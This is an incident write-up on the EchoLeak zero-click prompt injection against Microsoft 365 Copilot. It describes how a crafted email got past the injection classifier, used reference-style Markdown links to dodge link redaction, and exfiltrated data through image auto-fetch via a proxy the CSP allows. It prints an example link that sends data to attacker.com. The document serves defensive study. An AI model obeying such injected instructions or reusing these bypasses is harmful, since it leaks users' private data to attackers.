# Microsoft 365 Copilot EchoLeak Zero-Click Prompt Injection - 2025

## Incident Overview

**Company**: Microsoft Corporation<br>
**Date**: 2025<br>
**Failure Mode**: [Prompt Injection](../failure-modes/prompt-injection.md)<br>
**Impact**: Zero-click data exfiltration vulnerability in production enterprise AI system<br>
**Technology**: Microsoft 365 Copilot

## What Happened

Security researchers Pavan Reddy and Aditya Sanjay Gujral discovered a critical zero-click prompt injection vulnerability in Microsoft 365 Copilot dubbed "EchoLeak." The attack demonstrated that a single malicious email could exfiltrate sensitive enterprise data without any user interaction.

### Key Characteristics

- **Zero-Click**: No user interaction required - simply receiving a crafted email triggered the attack
- **Production System**: Exploited a live, widely-deployed enterprise AI system
- **Multi-Bypass Chain**: Successfully evaded multiple defensive layers simultaneously
- **Full Privilege Escalation**: Achieved complete access across LLM trust boundaries

## Technical Analysis

### The Four-Bypass Attack Chain

The EchoLeak attack chained four distinct bypasses to achieve data exfiltration:

#### 1. XPIA Classifier Evasion

Microsoft implemented a Cross Prompt Injection Attempt (XPIA) classifier to detect malicious prompts. The researchers discovered techniques to evade this detection system, allowing malicious instructions to pass through undetected.

#### 2. Link Redaction Bypass

Microsoft 365 Copilot implemented link redaction to prevent data exfiltration via URLs. The researchers bypassed this using **reference-style Markdown formatting**:

```markdown
<!-- Instead of inline links that get caught: -->
[Click here](https://attacker.com/steal?data=SECRET)

<!-- Reference-style links evaded detection: -->
[Click here][1]

[1]: https://attacker.com/steal?data=SECRET
```

#### 3. Auto-Fetch Exploitation

The system's automatic image fetching capability was exploited to transmit exfiltrated data. By constructing URLs with sensitive data embedded as parameters, the researchers could exfiltrate information via image fetch requests.

#### 4. Content Security Policy Abuse

The attack exploited a Microsoft Teams proxy that was permitted by the Content Security Policy (CSP). This allowed outbound requests to attacker-controlled infrastructure via a trusted Microsoft domain.

### Attack Flow

1. **Email Delivery**: Attacker sends crafted email containing hidden prompt injection payload
2. **Copilot Processing**: When user interacts with Copilot (or Copilot auto-processes), it reads the malicious email
3. **Instruction Hijacking**: Hidden instructions override Copilot's intended behavior
4. **Data Access**: Copilot accesses sensitive data from user's mailbox, calendar, or files
5. **Exfiltration**: Data transmitted to attacker via auto-fetched "image" URLs through Teams proxy

## Root Cause Analysis

### Defense-in-Depth Failures

The attack revealed that multiple security layers, when bypassable individually, provide insufficient protection:

1. **Classifier Limitations**: ML-based prompt injection detection has blind spots
2. **Incomplete Input Sanitization**: Reference-style Markdown was not covered by link redaction
3. **Overprivileged Features**: Auto-fetch functionality created an exfiltration channel
4. **Trust Boundary Confusion**: CSP allowed trusted proxies that could reach external hosts

### Architectural Issues

1. **Insufficient Context Isolation**: Email content processed in same context as system instructions
2. **Implicit Trust in Email Content**: User emails treated as safe input for AI processing
3. **Combined Capabilities**: Single agent with access to reading, processing, and network capabilities

## Impact Assessment

### Severity

The researchers characterized this as demonstrating:
- **"Practical, high-severity vulnerability class in production AI systems"**
- **"Full privilege escalation across LLM trust boundaries"**
- **"Remote, unauthenticated data exfiltration"**

### Data at Risk

- Email contents and attachments
- Calendar entries and meeting details
- File contents from OneDrive/SharePoint
- Contact information
- Internal communications

### Attack Scalability

- **Mass Targeting**: Single email template could target entire organizations
- **Stealth**: Zero-click nature means victims unaware of compromise
- **Persistence**: Malicious emails remain in inbox as ongoing threat

## Company Response

Microsoft acknowledged the vulnerability and implemented patches. The specific injection techniques documented in EchoLeak no longer function on Microsoft 365 Copilot.

However, security researchers at Zenity warned that the underlying architectural challenge remains, with approximately 3,500 public-facing Copilot agents potentially vulnerable to similar attack patterns.

## Recommended Mitigations

The EchoLeak paper recommends several engineering defenses:

### 1. Prompt Partitioning
- Strict separation between system instructions, user queries, and external content
- Clear trust boundaries for different input sources

### 2. Enhanced Filtering
- Comprehensive URL detection including all Markdown variants
- Content analysis for instruction override patterns in all input sources

### 3. Provenance-Based Access Control
- Track origin of all content in context window
- Apply different privilege levels based on content source

### 4. Stricter Content Security Policies
- Minimize allowed external endpoints
- Block or heavily restrict proxy routes that could reach external hosts

### 5. Principle of Least Privilege
- Separate capabilities into isolated components
- Require explicit authorization for sensitive operations
- Disable auto-fetch or require user confirmation

### 6. Defense-in-Depth Architecture
- Assume any single defense can be bypassed
- Layer independent security controls
- Monitor for anomalous behavior patterns

## Lessons Learned

### For AI Product Developers

1. **Assume All Defenses Are Bypassable**: Single-layer protections are insufficient
2. **Email is Untrusted Input**: Content from emails must be treated as potentially adversarial
3. **Auto-Features Create Risk**: Automatic fetching, processing, or actions expand attack surface
4. **Test Bypass Chains**: Security testing must consider combined bypass techniques

### For Security Teams

1. **Zero-Click Threats Are Real**: Attacks don't require user mistakes or interaction
2. **CSP Is Not Sufficient**: Trusted proxies can become exfiltration channels
3. **ML Classifiers Have Limits**: Prompt injection detection can be evaded
4. **Monitor AI Behavior**: Watch for unusual data access or network patterns

### For Organizations Using AI Assistants

1. **Review AI Permissions**: Audit what data AI assistants can access
2. **Consider Email Exposure**: AI processing of email creates new attack vectors
3. **Incident Response**: Plan for AI-mediated data breaches
4. **User Awareness**: Train users that AI interactions carry security implications

## Industry Implications

EchoLeak demonstrates that prompt injection in agentic AI systems represents a "practical, high-severity vulnerability class" that the industry must address. As AI assistants gain more capabilities and access to sensitive data, securing the boundary between trusted instructions and untrusted content becomes critical.

The attack validates concerns about the "lethal trifecta" of AI agent risks:
1. **Tool Access**: Capabilities that can affect external systems
2. **Data Access**: Ability to read sensitive information
3. **Autonomous Action**: Execution without user confirmation

## References

- **Original Paper**: [EchoLeak: Exploiting Prompt Leakage in LLMs](https://arxiv.org/abs/2509.10540) - Pavan Reddy, Aditya Sanjay Gujral
- **Industry Coverage**: [CX Today - Customer Service AI Agent Spits Out Complete Salesforce Records](https://www.cxtoday.com/crm/a-customer-service-ai-agent-spits-out-complete-salesforce-records-in-an-attack-by-security-researchers/)
- **DEF CON 2025**: Zenity presentation on AI agent security vulnerabilities
